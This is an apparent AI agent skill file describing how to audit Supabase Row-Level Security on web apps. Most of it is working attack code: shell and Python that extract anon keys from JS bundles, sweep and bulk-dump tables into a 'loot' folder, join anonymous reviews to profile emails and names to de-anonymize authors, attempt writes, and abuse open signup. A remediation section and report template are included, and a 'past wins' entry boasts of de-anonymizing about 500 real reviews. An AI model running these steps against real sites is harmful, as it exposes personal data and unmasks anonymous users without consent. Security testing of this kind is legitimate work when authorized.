---
name: supabase-rls-audit
description: Audit Supabase Row-Level Security (RLS) configuration on Next.js / Vite / SPA web apps. Pulls the project URL + anon JWT out of JS bundles, probes every common table via PostgREST with the anon role, classifies which are over-permissive (read/write), and builds de-anonymization chains across foreign keys. Use when you find a `*.supabase.co` URL in a recon target, or when auditing any Next.js app that ships an `apikey:` header in the browser.
---

# Supabase RLS Audit

Real-world Supabase apps frequently misconfigure RLS — either no RLS at all, or policies for some tables but not others. The anon JWT is *meant* to be public (Supabase ships it in every browser bundle); security depends entirely on per-table RLS policies. This skill assumes that and probes systematically.

## When to fire

- Recon turns up `*.supabase.co` strings in a JS bundle.
- Browser DevTools shows `apikey:` and `Authorization: Bearer eyJhbGc…` headers on `/rest/v1/*`.
- Frontend uses `@supabase/supabase-js` (look for `createClient`, `from(`, `signInWith*` in JS).
- Stack fingerprint = Next.js / Nuxt / SvelteKit + an obvious data API not on the same origin.

## The audit pipeline

### Step 1 — Extract Supabase URL + anon key

The anon key is by design in the browser bundle. Find both with one grep:

```bash
mkdir -p osint/js && cd osint
curl -s https://TARGET/ -o index.html
grep -oP 'src="\K/_next/static/chunks/[a-f0-9]+\.js' index.html | \
  while read p; do curl -s "https://TARGET$p" -o "js/$(basename $p)"; done

# URL
grep -rhoE 'https://[a-z0-9]+\.supabase\.co' js/ | sort -u
# Anon JWT (3-part, role=anon in payload — decode to confirm)
grep -rhoE 'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+' js/ | sort -u
```

If the project ships static export only (no chunks under `/_next/static/`), look in `/assets/*.js` (Vite), `/_app/*.js` (SvelteKit), or any obvious main bundle.

### Step 2 — Sanity-check the JWT is `anon`

```bash
ANON="eyJhbGciOi…"
echo "${ANON#*.}" | cut -d. -f1 | base64 -d 2>/dev/null
# expect: {"iss":"supabase","ref":"<project>","role":"anon", …}
```

Decoding tells you (a) the project ref (matches the URL), (b) `role:anon` (good — service_role would be a worse leak entirely), and (c) the issuance/expiry dates.

### Step 3 — Table existence sweep

A small helper sends a no-op `?limit=0` query against each candidate name. 200 = table exists *and* anon can SELECT.

```bash
SUPA="https://<ref>.supabase.co"
ANON="eyJ…"
H=(-H "apikey: $ANON" -H "Authorization: Bearer $ANON")

for t in users user profiles profile lecturers students teachers \
         reviews comments posts replies messages chats \
         orders products items inventory \
         notifications notification reports report \
         claims hide_requests suggestions audit_log logs \
         admins moderators roles permissions \
         organizations teams memberships \
         payments transactions tokens api_keys; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$SUPA/rest/v1/$t?limit=0" "${H[@]}")
  echo "$t -> $code"
done
```

Always 200/206 means *at least* SELECT for anon. 401 with `Invalid API key` body means schema is fine but `Prefer:` header missing. 404 means the table doesn't exist (or is in a different schema).

### Step 4 — Sample + count each readable table

```bash
TABLE=profiles
curl -s "$SUPA/rest/v1/$TABLE?limit=3" "${H[@]}" | jq .
curl -sI "$SUPA/rest/v1/$TABLE?select=count" "${H[@]}" \
     -H "Prefer: count=exact" | grep -i content-range
```

The `Content-Range: 0-0/<TOTAL>` header gives you the row count without dumping. Use this to size up impact before bulk-pulling.

### Step 5 — Bulk dump (paginated)

PostgREST default cap is 1000 rows; use the `Range` header to walk:

```python
import requests, json
SUPA, ANON = "https://<ref>.supabase.co", "eyJ…"
H = {"apikey": ANON, "Authorization": f"Bearer {ANON}"}

def dump(table, page=1000, key=None):
    out, off = [], 0
    while True:
        params = {"limit": page, "offset": off}
        if key: params["order"] = key      # cursor stability
        r = requests.get(f"{SUPA}/rest/v1/{table}", params=params, headers=H, timeout=15)
        r.raise_for_status()
        rows = r.json()
        out.extend(rows)
        if len(rows) < page: break
        off += page
    open(f"loot/{table}.json","w").write(json.dumps(out, ensure_ascii=False, indent=2))
    print(f"{table}: {len(out)}")
```

If the table's PK column isn't `id` (e.g. `code` for a lecturers table), pass `key="code"` — otherwise PostgREST returns `42703 column does not exist`.

### Step 6 — Build de-anonymization chains

This is the highest-impact step on review/comment/feedback platforms. The pattern:

1. Find a table with `is_anonymous` / `is_private` / `hidden_from_public` flag (call it the *content* table).
2. See whether it still carries a `user_id` / `author_id` / `creator_id` foreign key when that flag is true.
3. JOIN that FK to the `profiles` / `users` table you already dumped.

```python
profiles = {p["id"]: p for p in json.load(open("loot/profiles.json"))}
content  = json.load(open("loot/reviews.json"))

deanon = []
for row in content:
    if not row.get("is_anonymous"): continue
    uid = row.get("user_id") or row.get("author_id")
    p = profiles.get(uid)
    if p:
        deanon.append({**row, "real_email": p.get("email"), "real_name": p.get("display_name")})

print(f"de-anonymized {len(deanon)} rows")
```

If even one anonymous row resolves, the platform's privacy contract is broken — independent of how many *other* RLS bugs there are.

### Step 7 — Probe the write surface (read-only-safe)

Use `Prefer: return=representation` so PostgREST tells you whether the row was actually touched. With this header:

- 200 + non-empty array → write succeeded.
- 200 + `[]`           → write was silently rejected by RLS (or no rows matched the filter).
- 401/403              → policy hard-rejected.

```bash
# attempt to flip a column on a known row
curl -s -X PATCH "$SUPA/rest/v1/lecturers?code=eq.<pick-one>" \
  "${H[@]}" -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"is_visible":true}'

# attempt insert
curl -s -X POST "$SUPA/rest/v1/profiles" \
  "${H[@]}" -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"id":"00000000-0000-0000-0000-000000000999","email":"probe@example.invalid"}'
```

Always test on rows that are either yours, fake (non-existent UUID), or already exactly equal to the value you're "writing". Re-read `updated_at` after to confirm whether the DB actually mutated. The 200/`[]` ambiguity is the single most common analyst error in Supabase auditing — without `return=representation` you cannot distinguish "RLS allowed but matched zero rows" from "RLS silently denied".

### Step 8 — Auth surface

```bash
curl -s "$SUPA/auth/v1/settings" -H "apikey: $ANON" | jq .
```

Tells you which OAuth providers are enabled, whether `disable_signup` is set, whether `mailer_autoconfirm` is on (a low-friction account-creation channel), and whether passkeys/SAML are wired. `disable_signup: false` + permissive RLS on per-user tables = anyone can self-onboard and reach data.

If the app uses Google OAuth and `disable_signup: false`, the realistic attack flow is "spin up a free throwaway gmail → sign in → call /api/* with the bearer token". This often unlocks a wider-than-intended `authenticated` role.

### Step 9 — Storage buckets

If table rows reference URLs like `https://*.public.blob.vercel-storage.com/*` or `https://<ref>.supabase.co/storage/v1/object/public/<bucket>/…`, the bucket is **explicitly** public:

```bash
# Vercel Blob (the URL is enumerable from any row that references it)
curl -I "https://<bucket-id>.public.blob.vercel-storage.com/<filename>"

# Supabase Storage public objects
curl -I "$SUPA/storage/v1/object/public/<bucket>/<path>"
# Listing:
curl -s "$SUPA/storage/v1/object/list/<bucket>" -H "apikey: $ANON" \
     -H "Content-Type: application/json" -d '{"limit":100,"prefix":""}'
```

If "user-uploaded proof image" / "ID card" / "screenshot" type columns reference a public bucket, the impact of the read-side RLS leak balloons (PII inside the *images*, not just the row).

## Triage cheatsheet

| Observation | Severity | Action |
| --- | --- | --- |
| anon can SELECT `profiles`/`users` with email/name/avatar | Critical | Dump count, sample 3, file CVSS 7+ |
| anon can SELECT a content table that carries `user_id` for anon rows | Critical | Build de-anon chain (§6); this is the killer finding |
| anon can SELECT internal tables (logs, audit, payments) | Critical | Stop, document, do not pull |
| anon can INSERT/UPDATE/DELETE on any table after RLS is supposed to deny | Critical | Verified with `return=representation`; minimal-impact write only |
| `disable_signup: false` + per-user RLS that trusts `authenticated` blanket | High | Sign up, retry sweep with the new bearer |
| Public storage bucket referenced from a leaked column | Medium-High | Sample a file, do not bulk-download |
| Anon can SELECT correctly-scoped tables (notifications, etc.) | None | Document that RLS *was* applied to these — strengthens the report |

## Reporting template

```
## Supabase RLS misconfiguration

- Project: <ref> (<URL>)
- Anon JWT: present in browser bundle (intended; `role:anon`)
- Tables anon can SELECT: <list>      ← name each, with row count
- Tables anon can INSERT/UPDATE/DELETE: <list>  ← name each
- De-anon chain: <content_table>.user_id → profiles.{email, display_name}
  - <N> rows where is_anonymous=true had user_id present
  - All <N> resolve to real identities

## Remediation

1. `alter table <T> enable row level security;` for each leaked table.
2. Replace public SELECT with minimal projections (column GRANT or view).
3. For anonymous content: NULL out user_id on insert OR move FK into a separate
   RLS-locked join table (`<content>_authors`).
4. Privatize public storage buckets, serve through signed-URL API routes.
5. Audit *every* table: `select c.relname, c.relrowsecurity from pg_class c join
   pg_namespace n on n.oid=c.relnamespace where n.nspname='public' and
   c.relkind='r' and not c.relrowsecurity;`
```

## Past wins applying this skill

- **University review platform (anonymized)** — a Supabase-backed app where 1,400+ profiles
  and 1,000+ reviews were readable to anonymous users, and ~500 anonymous reviews could be
  fully de-anonymized by joining public tables. Time-to-crit: ~8 min from first request.
  The fix was enabling RLS on the two offending tables plus a `profiles` join-policy rewrite.
